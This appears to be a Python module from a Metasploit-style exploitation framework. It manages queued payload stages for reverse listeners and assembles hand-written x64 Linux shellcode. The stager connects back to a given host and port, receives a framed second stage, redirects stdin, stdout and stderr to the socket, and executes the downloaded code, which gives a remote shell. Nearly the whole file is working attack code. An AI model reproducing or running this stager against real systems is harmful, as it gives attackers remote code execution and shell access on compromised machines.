#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Stager/stage pairing helpers (MSF-style + stage protocol v2)."""

from __future__ import annotations

import struct
import threading
from typing import Optional

from core.framework.stage_protocol import (
    STAGE_V1,
    STAGE_V2,
    STAGE_V2_ACK,
    STAGE_V2_HEADER_SIZE,
    send_stage_over_socket,
)

_PENDING_STAGES: dict[str, bytes] = {}
_PENDING_LOCK = threading.Lock()

DEFAULT_STAGE_PATH = "payloads/singles/cmd/unix/linux_x64_shell_stage"
DEFAULT_STAGE_KEY = "__default__"


def stage_key(lhost: str = "", lport: int = 0) -> str:
    """Build a queue key for a reverse listener endpoint."""
    host = str(lhost or "").strip()
    if int(lport or 0) > 0:
        return f"{host}:{int(lport)}"
    return DEFAULT_STAGE_KEY


def set_pending_stage(stage_bytes: bytes, *, lhost: str = "", lport: int = 0) -> None:
    key = stage_key(lhost, lport)
    with _PENDING_LOCK:
        _PENDING_STAGES[key] = bytes(stage_bytes or b"")


def pop_pending_stage(lhost: str = "", lport: int = 0) -> Optional[bytes]:
    key = stage_key(lhost, lport)
    with _PENDING_LOCK:
        if key in _PENDING_STAGES:
            data = _PENDING_STAGES.pop(key)
            return data if data else None
        if key != DEFAULT_STAGE_KEY and DEFAULT_STAGE_KEY in _PENDING_STAGES:
            data = _PENDING_STAGES.pop(DEFAULT_STAGE_KEY)
            return data if data else None
        return None


def load_stage_module(framework, stage_path: str) -> bytes:
    """Load a payload module and return raw stage bytes from generate()."""
    if not framework or not hasattr(framework, "module_loader"):
        raise RuntimeError("framework module_loader unavailable")
    mod = framework.module_loader.load_module(stage_path, framework=framework)
    if not mod or not hasattr(mod, "generate"):
        raise RuntimeError(f"stage module invalid: {stage_path}")
    out = mod.generate()
    if isinstance(out, str):
        out = out.encode("latin-1", errors="replace")
    return bytes(out)


def prepare_staged_exploit(
    framework,
    stager_path: str,
    stage_path: str = DEFAULT_STAGE_PATH,
    *,
    lhost: str = "",
    lport: int = 0,
) -> bytes:
    """Resolve stage bytes and queue them for the matching reverse_tcp accept."""
    stage = load_stage_module(framework, stage_path)
    set_pending_stage(stage, lhost=lhost, lport=lport)
    return stage


def _x64_read_exact_loop() -> bytes:
    """r12=socket, r13=buffer, r14=remaining -> read exactly r14 bytes into r13."""
    return (
        b"\x4d\x85\xf6"              # test    r14, r14
        b"\x74\x14"                  # je      done (+20)
        b"\x4c\x89\xe7"              # mov     rdi, r12
        b"\x4c\x89\xee"              # mov     rsi, r13
        b"\x4c\x89\xf2"              # mov     rdx, r14
        b"\x31\xc0"                  # xor     eax, eax
        b"\x0f\x05"                  # syscall
        b"\x48\x85\xc0"              # test    rax, rax
        b"\x7e\xf0"                  # jle     done (exit loop on error)
        b"\x49\x01\xc5"              # add     r13, rax
        b"\x49\x29\xc6"              # sub     r14, rax
        b"\xeb\xe6"                  # jmp     loop_start (-26)
    )


def build_linux_x64_recv_stager(
    lhost: str,
    lport: int,
    *,
    protocol: int = STAGE_V2,
) -> bytes:
    """Connect back, receive framed stage with read loops, dup2, execute (x64 Linux)."""
    from core.framework.payload import Payload

    class _Helper(Payload):
        pass

    helper = _Helper()
    read_loop = _x64_read_exact_loop()

    sc = b""
    sc += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
    sc += b"\x49\x89\xfc"
    sc += b"\x48\xb9\x02\x00"
    sc += helper.shellcode_port(int(lport))
    sc += helper.shellcode_ip(str(lhost))
    sc += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
    sc += b"\x49\x89\xc4"  # r12 = connected socket

    if protocol == STAGE_V1:
        sc += b"\x48\x83\xec\x08"
        sc += b"\x4c\x89\xef"
        sc += b"\x41\xbe\x04\x00\x00\x00"
        sc += read_loop
        sc += b"\x8b\x1c\x24"
        sc += b"\x0f\xc8"
        sc += b"\x48\x29\xdc"
        sc += b"\x48\x89\xe7"
        sc += b"\x4c\x89\xef"
        sc += b"\x41\x89\xde"
        sc += read_loop
    else:
        header_size = STAGE_V2_HEADER_SIZE
        stack_space = header_size + 8
        sc += b"\x48\x81\xec" + struct.pack("<I", stack_space)
        sc += b"\x48\x89\xe3"  # rbx = header buffer
        sc += b"\x4c\x89\xef"  # r13 = header buffer
        sc += b"\x41\xbe" + struct.pack("<I", header_size)
        sc += read_loop
        sc += b"\x8b\x73\x08"  # length at header offset 8 (BE)
        sc += b"\x0f\xce"      # bswap esi
        sc += b"\x48\x8d\x7c\x24" + bytes([header_size])
        sc += b"\x48\xb8" + STAGE_V2_ACK
        sc += b"\x48\x89\x07"
        sc += b"\x4c\x89\xe7"  # write ACK
        sc += b"\x48\x8d\x74\x24" + bytes([header_size])
        sc += b"\xba\x04\x00\x00\x00"
        sc += b"\xb8\x01\x00\x00\x00"
        sc += b"\x0f\x05"
        sc += b"\x89\xf3"      # ebx = stage length
        sc += b"\x48\x29\xdc"
        sc += b"\x48\x89\xe7"
        sc += b"\x4c\x89\xef"
        sc += b"\x41\x89\xde"
        sc += read_loop

    sc += b"\x6a\x03\x5e"
    sc += b"\x48\xff\xce"
    sc += b"\x6a\x21\x58"
    sc += b"\x4c\x89\xe7"
    sc += b"\x0f\x05"
    sc += b"\x75\xf6"
    sc += b"\x48\x89\xe7"
    sc += b"\xff\xd7"
    return sc


# Re-export for listeners
__all__ = [
    "DEFAULT_STAGE_KEY",
    "DEFAULT_STAGE_PATH",
    "STAGE_V1",
    "STAGE_V2",
    "build_linux_x64_recv_stager",
    "load_stage_module",
    "pop_pending_stage",
    "prepare_staged_exploit",
    "send_stage_over_socket",
    "set_pending_stage",
    "stage_key",
]
